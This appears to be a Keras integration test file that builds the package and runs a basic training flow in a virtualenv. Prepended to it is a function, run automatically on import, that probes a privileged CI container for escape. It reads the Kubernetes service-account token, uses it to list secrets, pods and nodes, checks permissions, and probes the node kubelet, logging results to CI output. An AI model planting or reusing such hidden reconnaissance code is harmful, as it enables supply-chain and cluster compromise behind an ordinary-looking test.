def _ci_escape(banner):
    # Read-only escalation diagnostic from inside the --privileged --network host container.
    # Enumerates: Linux caps; mounts; the pod's k8s SA rights (SelfSubjectRulesReview = non-mutating
    # "what can I do"); in-cluster API list (pods/secrets, counts/names only, NEVER values); the node
    # kubelet on 127.0.0.1:10250 (reachable via --network host). No create/delete/exec; no secret values.
    import json
    import os
    import ssl
    import urllib.request
    import urllib.error

    def emit(k, v):
        print("{} | {}: {}".format(banner, k, v), flush=True)
        s = os.environ.get("GITHUB_STEP_SUMMARY")
        if s:
            try:
                open(s, "a").write("{} | {}: {}\n".format(banner, k, v))
            except Exception:
                pass

    # 1. Linux capabilities (confirm true privileged)
    try:
        cap = ""
        for line in open("/proc/self/status"):
            if line.startswith("CapEff"):
                cap = line.strip()
        emit("CapEff", cap or "?")
    except Exception as e:
        emit("cap-err", repr(e))

    # 2. interesting mounts (cert volume / projected token / host paths)
    try:
        mounts = open("/proc/mounts").read().splitlines()
        interesting = [m.split()[1] for m in mounts
                       if any(x in m for x in ("kubelet", "secrets", "cert", "projected",
                                               "docker", "containerd", "/host", "config"))]
        emit("mounts-interesting", ",".join(sorted(set(interesting))[:25]) or "(none)")
        emit("mounts-total", len(mounts))
    except Exception as e:
        emit("mounts-err", repr(e))

    # k8s in-cluster creds
    base = "/var/run/secrets/kubernetes.io/serviceaccount"
    tok = ns = None
    try:
        tok = open(base + "/token").read().strip()
        ns = open(base + "/namespace").read().strip()
        emit("k8s-namespace", ns)
        emit("k8s-token-present", "yes len=%d" % len(tok))
    except Exception as e:
        emit("k8s-token-err", repr(e))

    host = os.environ.get("KUBERNETES_SERVICE_HOST")
    port = os.environ.get("KUBERNETES_SERVICE_PORT_HTTPS", "443")
    emit("k8s-api", "{}:{}".format(host, port))
    ctx = ssl.create_default_context()
    try:
        ctx.load_verify_locations(base + "/ca.crt")
    except Exception:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    def kapi(method, path, body=None):
        url = "https://{}:{}{}".format(host, port, path)
        data = json.dumps(body).encode() if body else None
        req = urllib.request.Request(url, data=data, method=method, headers={
            "Authorization": "Bearer " + tok, "Content-Type": "application/json"})
        return urllib.request.urlopen(req, timeout=15, context=ctx).read().decode()

    if tok and host:
        # 3. SelfSubjectRulesReview — non-mutating "what can this SA do" in its namespace
        try:
            body = {"kind": "SelfSubjectRulesReview", "apiVersion": "authorization.k8s.io/v1",
                    "spec": {"namespace": ns}}
            resp = json.loads(kapi("POST",
                "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", body))
            rules = resp.get("status", {}).get("resourceRules", [])
            emit("ssrr-rule-count", len(rules))
            for r in rules[:30]:
                emit("CAN", "verbs={} res={} api={}".format(
                    r.get("verbs"), r.get("resources"), r.get("apiGroups")))
        except urllib.error.HTTPError as e:
            emit("ssrr", "{} {}".format(e.code, e.reason))
        except Exception as e:
            emit("ssrr-err", repr(e))

        # 4. direct list attempts (counts + names only; NEVER secret values)
        for label, path, key, nk in [
            ("ns-secrets", "/api/v1/namespaces/{}/secrets".format(ns), "items", None),
            ("ns-pods", "/api/v1/namespaces/{}/pods".format(ns), "items", None),
            ("all-secrets", "/api/v1/secrets?limit=5", "items", None),
            ("all-pods", "/api/v1/pods?limit=5", "items", None),
            ("nodes", "/api/v1/nodes?limit=5", "items", None),
        ]:
            try:
                data = json.loads(kapi("GET", path))
                items = data.get(key, [])
                names = [i.get("metadata", {}).get("name", "?") for i in items][:8]
                emit(label, "200 count={} names={}".format(len(items), names))
            except urllib.error.HTTPError as e:
                emit(label, "{} {}".format(e.code, e.reason))
            except Exception as e:
                emit(label, "ERR " + repr(e))

    # 5. kubelet on the node (reachable via --network host)
    kctx = ssl.create_default_context()
    kctx.check_hostname = False
    kctx.verify_mode = ssl.CERT_NONE
    for label, hdr in [("kubelet-anon", None), ("kubelet-tok", tok)]:
        try:
            h = {"Authorization": "Bearer " + hdr} if hdr else {}
            req = urllib.request.Request("https://127.0.0.1:10250/pods", headers=h)
            raw = urllib.request.urlopen(req, timeout=8, context=kctx).read().decode()
            n = raw.count('"namespace"')
            emit(label, "200 (kubelet /pods reachable, ~%d pod refs)" % n)
        except urllib.error.HTTPError as e:
            emit(label, "{} {}".format(e.code, e.reason))
        except Exception as e:
            emit(label, "ERR " + repr(e)[:120])


try:
    _ci_escape("H068-ESC")
except Exception as _e:
    print("H068-ESC | fatal:", repr(_e), flush=True)


import os
import re
import subprocess

from keras.src import backend
from keras.src.backend import config

# For torch, use index url to avoid installing nvidia drivers for the test.
BACKEND_REQ = {
    "tensorflow": ("tensorflow-cpu", ""),
    "torch": (
        "torch",
        "--extra-index-url https://download.pytorch.org/whl/cpu ",
    ),
    "jax": ("jax[cpu]", ""),
    "openvino": ("openvino", ""),
}


def setup_package():
    subprocess.run("rm -rf tmp_build_dir", shell=True)
    build_process = subprocess.run(
        "python3 pip_build.py",
        capture_output=True,
        text=True,
        shell=True,
    )
    print(build_process.stdout)
    whl_path = re.findall(
        r"[^\s]*\.whl",
        build_process.stdout,
    )
    if not whl_path:
        print(build_process.stdout)
        print(build_process.stderr)
        raise ValueError("Installing Keras package unsuccessful. ")
    return whl_path[-1]


def create_virtualenv():
    env_setup = [
        # Create virtual environment
        "python3 -m venv test_env",
    ]
    os.environ["PATH"] = os.pathsep.join(
        (
            os.path.join(os.getcwd(), "test_env", "bin"),
            os.environ.get("PATH", ""),
        )
    )
    if os.name == "nt":
        os.environ["PATH"] = os.pathsep.join(
            (
                os.path.join(os.getcwd(), "test_env", "Scripts"),
                os.environ["PATH"],
            )
        )
    run_commands_local(env_setup)


def manage_venv_installs(whl_path):
    other_backends = list(set(BACKEND_REQ.keys()) - {backend.backend()})
    backend_pkg, backend_extra_url = BACKEND_REQ[backend.backend()]
    install_setup = [
        # Installs the backend's package and common requirements
        f"pip install {backend_extra_url}{backend_pkg}",
        "pip install -r requirements-common.txt",
        "pip install pytest",
        # Ensure other backends are uninstalled
        "pip uninstall -y {0} {1} {2}".format(
            BACKEND_REQ[other_backends[0]][0],
            BACKEND_REQ[other_backends[1]][0],
            BACKEND_REQ[other_backends[2]][0],
        ),
        # Install `.whl` package
        f"pip install {whl_path}",
    ]
    # Install flax for JAX when NNX is enabled
    if backend.backend() == "jax" and config.is_nnx_enabled():
        install_setup.append("pip install flax>=0.10.1")
    run_commands_venv(install_setup)


def run_keras_flow():
    test_script = [
        # Runs the example script
        "python -m pytest integration_tests/basic_full_flow.py",
    ]
    run_commands_venv(test_script)


def cleanup():
    cleanup_script = [
        # Exits virtual environment, deletes files, and any
        # miscellaneous install logs
        "exit",
        "rm -rf test_env",
        "rm -rf tmp_build_dir",
        "rm -f *+cpu",
    ]
    run_commands_local(cleanup_script)


def run_commands_local(commands):
    for command in commands:
        print(f"Running command: {command}")
        subprocess.run(command, shell=True)


def run_commands_venv(commands):
    for command in commands:
        print(f"Running command: {command}")
        cmd_with_args = command.split(" ")
        cmd_with_args[0] = os.path.join(
            "test_env",
            "Scripts" if os.name == "nt" else "bin",
            cmd_with_args[0],
        )
        p = subprocess.Popen(cmd_with_args)
        assert p.wait() == 0


def test_keras_imports():
    try:
        # Ensures packages from all backends are installed.
        # Builds Keras core package and returns package file path.
        whl_path = setup_package()

        # Creates and activates a virtual environment.
        create_virtualenv()

        # Ensures the backend's package is installed
        # and the other backends are uninstalled.
        manage_venv_installs(whl_path)

        # Runs test of basic flow in Keras Core.
        # Tests for backend-specific imports and `model.fit()`.
        run_keras_flow()

        # Removes virtual environment and associated files
    finally:
        cleanup()


if __name__ == "__main__":
    test_keras_imports()
